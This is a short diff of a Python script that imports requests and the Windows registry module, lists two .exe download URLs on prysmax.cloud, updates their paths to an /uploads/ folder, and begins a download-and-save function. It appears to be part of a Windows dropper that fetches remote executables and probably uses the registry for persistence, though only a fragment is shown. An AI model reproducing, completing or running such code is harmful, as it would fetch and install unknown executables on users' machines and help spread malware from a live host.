@@ -4,8 +4,8 @@ import requests
 import winreg as reg
 
 burls = [
-    "https://prysmax.cloud/archivo1.exe",
-    "https://prysmax.cloud/archivo2.exe"
+    "https://prysmax.cloud/uploads/archivo1.exe",
+    "https://prysmax.cloud/uploads/archivo2.exe"
 ]
 
 def descargar_y_guardar(url, carpeta):
